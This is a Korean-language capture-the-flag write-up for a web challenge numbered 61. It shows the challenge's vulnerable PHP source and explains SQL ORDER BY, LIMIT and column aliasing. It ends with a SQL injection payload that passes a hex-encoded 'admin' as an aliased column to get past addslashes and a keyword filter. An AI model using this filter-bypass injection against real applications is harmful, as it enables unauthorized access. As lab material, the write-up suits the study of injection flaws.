#61
===

이번 문제를 보면 view_source하나 밖에 없다.

그러면 소스를 살펴보자.
```
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
  $db = dbconnect();
  if(!$_GET['id']) $_GET['id']="guest";
  echo "<html><head><title>Challenge 61</title></head><body>";
  echo "<a href=./?view_source=1>view-source</a><hr>";
  $_GET['id'] = addslashes($_GET['id']);
  if(preg_match("/\(|\)|select|from|,|by|\./i",$_GET['id'])) exit("Access Denied");
  if(strlen($_GET['id'])>15) exit("Access Denied");
  $result = mysqli_fetch_array(mysqli_query($db,"select {$_GET['id']} from chall61 order by id desc limit 1"));
  echo "<b>{$result['id']}</b><br>";
  if($result['id'] == "admin") solve(61);
  echo "</body></html>";
?>
```

먼저 소스 코드를 이해하기 위해 모르는 함수들을 검색해 보았다

* 데이터 정렬

`select * from 테이블명 order by 기준컬럼 desc`



* 데이터 정렬 갯수

```
select * from 테이블명 order by 기준컬럼 desc limit 3( 0번째부터 3개 내림차순 출력)

select * from 테이블명 order by 기준컬럼 asc limit 3, 3(4번째부터 3개 오름차순 출력)
```


id의 디폴트 값은 guest로 설정되어있음을 알 수 있고 get 방식으로 입력받은 값을 테이블에서 가져와서 result 값으로 옮겨짐을 알 수 있다.

또한 이 result 값이 admin일때 문제가 해결된다.


이 문제를 해결하기 위해 `컬럼별칭` 이라는 것을 이용해준다.

* SELECT a id from table
> id 이라는 컬럼에  a 라는 별명을 붙혀서 a 의 값이 출력되어 나오게 한다.
이를 이용하면 id 값을 admin으로 만들 수 있을 것이다.

한가지 알아야될 점은 별칭의 이름이 ASCII가 아닌 문자열일 경우 쌍 따옴표(")를 붙여야 하는데  
`addslashes($_GET['id']);`  
이것으로 인해 "admin" 을 사용 할 수가 없으므로 admin을 헥스값으로 바꿔준후 get으로 입력해주면된다.

```
?id=0x61646D696E%20id
```

